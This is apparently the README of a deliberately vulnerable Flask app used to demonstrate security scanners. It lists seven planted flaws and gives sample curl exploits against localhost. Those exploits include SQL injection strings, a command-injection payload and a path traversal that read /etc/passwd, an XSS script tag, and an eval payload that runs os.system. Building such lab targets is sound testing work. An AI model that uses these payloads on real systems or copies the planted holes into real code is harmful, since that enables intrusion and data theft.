# Vulnerable Python Flask Demo App

This is an intentionally vulnerable Flask application for demonstrating security scanning capabilities.

## Vulnerabilities Included

1. **SQL Injection (CWE-89)**: `/user/<id>` and `/search` endpoints
2. **Command Injection (CWE-78)**: `/exec` and `/shell` endpoints
3. **Insecure Deserialization (CWE-502)**: `/deserialize` endpoint
4. **Cross-Site Scripting (CWE-79)**: `/render` endpoint
5. **Code Injection (CWE-95)**: `/eval` endpoint
6. **Hardcoded Credentials (CWE-798)**: API_KEY and DATABASE_PASSWORD
7. **Debug Mode Enabled (CWE-489)**: app.config['DEBUG'] = True

## Running

```bash
pip install -r requirements.txt
python app.py
```

## Example Exploits

### SQL Injection
```bash
curl "http://localhost:5000/user/1%20OR%201=1"
curl "http://localhost:5000/search?q=%27%20OR%20%271%27=%271"
```

### Command Injection
```bash
curl "http://localhost:5000/exec?cmd=;%20cat%20/etc/passwd"
curl "http://localhost:5000/shell?file=../../etc/passwd"
```

### XSS
```bash
curl "http://localhost:5000/render?content=<script>alert('XSS')</script>"
```

### Code Injection
```bash
curl "http://localhost:5000/eval?expr=__import__('os').system('whoami')"
```
